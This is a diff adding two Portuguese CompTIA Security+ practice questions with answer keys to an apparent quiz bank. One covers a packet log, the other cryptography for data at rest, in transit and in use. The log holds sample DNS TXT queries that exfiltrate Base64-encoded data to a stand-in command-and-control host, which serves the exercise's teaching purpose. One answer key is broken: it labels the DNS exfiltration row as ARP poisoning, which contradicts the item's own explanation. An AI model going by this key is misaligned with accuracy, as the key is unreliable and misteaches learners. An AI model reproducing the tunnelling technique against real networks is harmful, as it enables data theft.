+              "text": "No. 3 10.0.1.25 -> 10.0.1.10 DNS 112 Standard query 0x1a2b TXT ZmF0dXJhX2NvbmZpZGVuY2lhbF8yMDI2.c2.attacker-exfil.net"
+            },
+            {
+              "id": "l4",
+              "text": "No. 4 10.0.1.25 -> 10.0.1.10 DNS 124 Standard query 0x1a2c TXT dXN1YXJpb3NfcGFzc3dvcmRfaGFzaGVz.c2.attacker-exfil.net"
+            },
+            {
+              "id": "l5",
+              "text": "No. 5 10.0.1.25 -> 192.0.2.1 TCP 74 49231 -> 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460"
+            },
+            {
+              "id": "l6",
+              "text": "No. 6 10.0.1.25 -> 10.0.1.10 DNS 118 Standard query 0x1a2d TXT c2VncmVkb19jb3Jwb3JhdGl2b19kYXRh.c2.attacker-exfil.net"
+            }
+          ]
+        }
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "select_in_exhibit",
+          "weight": 1,
+          "prompt": "Selecione TODAS as linhas do log que demonstram a exfiltração ativa de dados via canal encoberto de DNS (DNS Tunneling).",
+          "exhibit_id": "e1",
+          "select_mode": "multiple",
+          "solution": {
+            "selected": [
+              "l3",
+              "l4",
+              "l6"
+            ]
+          },
+          "scoring": {
+            "method": "tp_minus_fp"
+          },
+          "explanation": {
+            "summary": "As linhas l3, l4 e l6 trazem consultas TXT a subdomínios Base64 de alta entropia contendo dados exfiltrados.",
+            "per_item": {
+              "l3": "Linha l3: Consulta DNS TXT codificada em Base64 para c2.attacker-exfil.net.",
+              "l4": "Linha l4: Segunda consulta de exfiltração contendo carga útil fragmentada.",
+              "l6": "Linha l6: Terceira consulta confirmando o fluxo de túnel encoberto."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Selecione a técnica de ataque correspondente à anomalia de camada 2 (Linha 2) e a respectiva contramedida de segurança imediata.",
+          "columns": [
+            {
+              "id": "threat_type",
+              "label": "Incidente / Vetor Observado"
+            },
+            {
+              "id": "attack_name",
+              "label": "Identificação Técnica do Ataque",
+              "input_type": "select",
+              "choices": [
+                "ARP Poisoning / ARP Spoofing (Man-in-the-Middle)",
+                "MAC Flooding (Overflow de tabela CAM)",
+                "DNS Amplification DoS",
+                "DHCP Starvation Attack"
+              ]
+            },
+            {
+              "id": "mitigation_control",
+              "label": "Contramedida de Mitigação Imediata",
+              "input_type": "select",
+              "choices": [
+                "Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping no switch",
+                "Ativar DNS Sinkholing e bloquear o domínio no resolvedor recursivo",
+                "Configurar Port Security estático com shutdown por violação",
+                "Desabilitar o protocolo IPv4 em toda a rede"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "Anomalia de Camada 2 (Pacote No. 2 com resposta ARP não solicitada)",
+              "cells": {
+                "threat_type": {
+                  "editable": false,
+                  "value": "Anomalia de Camada 2 (Pacote No. 2 com resposta ARP não solicitada)"
+                },
+                "attack_name": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "ARP Poisoning / ARP Spoofing (Man-in-the-Middle)",
+                    "MAC Flooding (Overflow de tabela CAM)",
+                    "DNS Amplification DoS",
+                    "DHCP Starvation Attack"
+                  ]
+                },
+                "mitigation_control": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping no switch",
+                    "Ativar DNS Sinkholing e bloquear o domínio no resolvedor recursivo",
+                    "Configurar Port Security estático com shutdown por violação",
+                    "Desabilitar o protocolo IPv4 em toda a rede"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "Exfiltração via consultas de nomes (Pacotes No. 3, 4 e 6)",
+              "cells": {
+                "threat_type": {
+                  "editable": false,
+                  "value": "Exfiltração via consultas de nomes (Pacotes No. 3, 4 e 6)"
+                },
+                "attack_name": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "ARP Poisoning / ARP Spoofing (Man-in-the-Middle)",
+                    "MAC Flooding (Overflow de tabela CAM)",
+                    "DNS Amplification DoS",
+                    "DHCP Starvation Attack"
+                  ]
+                },
+                "mitigation_control": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping no switch",
+                    "Ativar DNS Sinkholing e bloquear o domínio no resolvedor recursivo",
+                    "Configurar Port Security estático com shutdown por violação",
+                    "Desabilitar o protocolo IPv4 em toda a rede"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "attack_name": {
+                  "accepted": [
+                    "ARP Poisoning / ARP Spoofing (Man-in-the-Middle)"
+                  ]
+                },
+                "mitigation_control": {
+                  "accepted": [
+                    "Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping no switch"
+                  ]
+                }
+              },
+              "r2": {
+                "attack_name": {
+                  "accepted": [
+                    "ARP Poisoning / ARP Spoofing (Man-in-the-Middle)"
+                  ]
+                },
+                "mitigation_control": {
+                  "accepted": [
+                    "Ativar DNS Sinkholing e bloquear o domínio no resolvedor recursivo"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "DAI protege contra envenenamento ARP combinada com DHCP Snooping; DNS Sinkhole redireciona domínios C2 maliciosos.",
+            "per_item": {
+              "r1": "ARP gratuito forjado visa envenenar a tabela ARP das vítimas para interceptar tráfego (MITM), mitigado por DAI.",
+              "r2": "DNS Sinkholing impede resolução do servidor C2 malicioso, bloqueando a exfiltração encoberta."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "No exame CompTIA Security+ SY0-701 (Objetivos 4.4 e 4.5), a capacidade de interpretar trechos de PCAP é crucial. Respostas ARP não solicitadas (gratuitous) são a assinatura clássica de ARP Spoofing/Poisoning, permitindo interceptação Man-in-the-Middle (MITM); a defesa padrão de rede é Dynamic ARP Inspection (DAI) acoplada a DHCP Snooping. Já o DNS Tunneling transmite dados confidenciais em subdomínios codificados para burlar firewalls tradicionais, exigindo inspeção de tráfego DNS e DNS Sinkholing.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 4.4: Analyzing Indicators / Domain 4.5: Security Operations"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 18"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Análise de pacotes PCAP para identificação de ARP Poisoning e DNS Tunneling."
+    },
+    {
+      "id": "sq_pbq_701_0016",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "General Security Concepts",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "1.4",
+        "3.3"
+      ],
+      "points": 3,
+      "title": "Soluções Criptográficas Avançadas e Proteção nos Três Estados dos Dados",
+      "scenario": "A TechHealth desenvolve soluções de telemedicina e processamento de dados genéticos em nuvem híbrida. Em conformidade com normas regulatórias (HIPAA e PCI-DSS), estruture as tecnologias e primitivas criptográficas adequadas para salvaguardar a informação nos três estados fundamentais: em repouso (At Rest), em trânsito (In Transit) e em uso/processamento (In Use).",
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "categorization",
+          "weight": 2,
+          "prompt": "Arraste cada tecnologia criptográfica para o ESTADO DOS DADOS em que ela atua prioritariamente como controle de segurança.",
+          "buckets": [
+            {
+              "id": "at_rest",
+              "label": "Data at Rest (Dados em Repouso)"
+            },
+            {
+              "id": "in_transit",
+              "label": "Data in Transit (Dados em Trânsito)"
+            },
+            {
+              "id": "in_use",
+              "label": "Data in Use (Dados em Uso / Processamento)"
+            }
+          ],
+          "items": [
+            {
+              "id": "i1",
+              "text": "Full Disk Encryption (BitLocker / LUKS) com chave vinculada a chip TPM"
+            },
+            {
+              "id": "i2",
+              "text": "Túnel TLS 1.3 com troca de chaves Ephemeral Diffie-Hellman (PFS)"
+            },
+            {
+              "id": "i3",
+              "text": "Enclave Seguro de Hardware (ex: Intel SGX / AMD SEV) isolando a memória RAM"
+            },
+            {
+              "id": "i4",
+              "text": "Criptografia Homomórfica permitindo computação em texto cifrado sem decriptação prévia"
+            },
+            {
+              "id": "i5",
+              "text": "Cifragem de banco de dados com Transparent Data Encryption (TDE) e custódia em HSM"
+            },
+            {
+              "id": "i6",
+              "text": "Túnel VPN IPsec em modo transporte autenticado com ESP e AES-GCM"
+            }
+          ],
+          "solution": {
+            "assignment": {
+              "i1": "at_rest",
+              "i2": "in_transit",
+              "i3": "in_use",
+              "i4": "in_use",
+              "i5": "at_rest",
+              "i6": "in_transit"
+            }
+          },
+          "scoring": {
+            "method": "per_item"
+          },
+          "explanation": {
+            "summary": "Dados em repouso residem em discos/bases; dados em trânsito trafegam pela rede; dados em uso residem na RAM/CPU.",
+            "per_item": {
+              "i1": "FDE protege volumes de armazenamento físico (at rest).",
+              "i2": "TLS 1.3 cifra a comunicação cliente-servidor pela rede (in transit).",
+              "i3": "Secure Enclave protege a região de memória durante o ciclo de execução da CPU (in use).",
+              "i4": "Criptografia homomórfica executa cálculos diretamente sobre os dados cifrados (in use).",
+              "i5": "TDE cifra os arquivos de dados e logs de transação no storage (at rest).",
+              "i6": "IPsec encapsula pacotes de dados na rede (in transit)."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "matching",
+          "weight": 1,
+          "prompt": "Associe cada exigência técnica de segurança (à esquerda) ao conceito ou mecanismo criptográfico correspondente (à direita).",
+          "left": [
+            {
+              "id": "req1",
+              "text": "Garantir que o comprometimento futuro da chave privada do servidor não permita decifrar sessões TLS gravadas no passado"
+            },
+            {
+              "id": "req2",
+              "text": "Substituir o número de cartão de crédito (PAN) por um identificador não sensível de mesmo formato sem valor intrínseco"
+            },
+            {
+              "id": "req3",
+              "text": "Dispositivo criptográfico dedicado e inviolável (tamper-evident) para geração e custódia segura de chaves mestres corporativas"
+            },
+            {
+              "id": "req4",
+              "text": "Adicionar valor pseudoaleatório ao texto plano antes do hashing para inviabilizar o uso de rainbow tables pré-computadas"
+            }
+          ],
+          "right": [
+            {
+              "id": "mec1",
+              "text": "Perfect Forward Secrecy (PFS) via chaves de sessão efêmeras (DHE/ECDHE)"
+            },
+            {
+              "id": "mec2",
+              "text": "Tokenização de Dados em conformidade com o PCI-DSS"
+            },
+            {
+              "id": "mec3",
+              "text": "Hardware Security Module (HSM)"
+            },
+            {
+              "id": "mec4",
+              "text": "Salting criptográfico de senhas"
+            }
+          ],
+          "solution": {
+            "pairs": {
+              "req1": "mec1",
+              "req2": "mec2",
+              "req3": "mec3",
+              "req4": "mec4"
+            }
+          },
+          "scoring": {
+            "method": "per_pair"
+          },
+          "explanation": {
+            "summary": "Conceitos fundamentais da criptografia moderna aplicados aos domínios 1 e 3 do exame SY0-701.",
+            "per_item": {
+              "req1": "PFS assegura sigilo progressivo gerando chaves temporárias para cada sessão.",
+              "req2": "Tokenização substitui dados confidenciais por tokens opacos sem relacionamento matemático.",
+              "req3": "HSM fornece proteção física e lógica com padrões FIPS 140-2/3 para armazenamento de chaves.",
+              "req4": "Salting garante hashes únicos para senhas idênticas, invalidando rainbow tables."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "A distinção entre Data at Rest, Data in Transit e Data in Use é um dos pontos mais cobrados no exame CompTIA Security+ SY0-701 (Objetivos 1.4 e 3.3). Soluções emergentes como computação confidencial (Secure Enclaves) e criptografia homomórfica resolvem o desafio histórico dos dados em uso (na memória volátil). Ao mesmo tempo, conceitos como Perfect Forward Secrecy (PFS), Hardware Security Modules (HSM) e Tokenização formam a base das exigências de segurança corporativa.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 1.4: Cryptographic Solutions / Domain 3.3: Data Protection"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 6 e 7"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Questão avançada sobre proteção nos três estados dos dados e primitivas criptográficas."
     }
   ]
 }
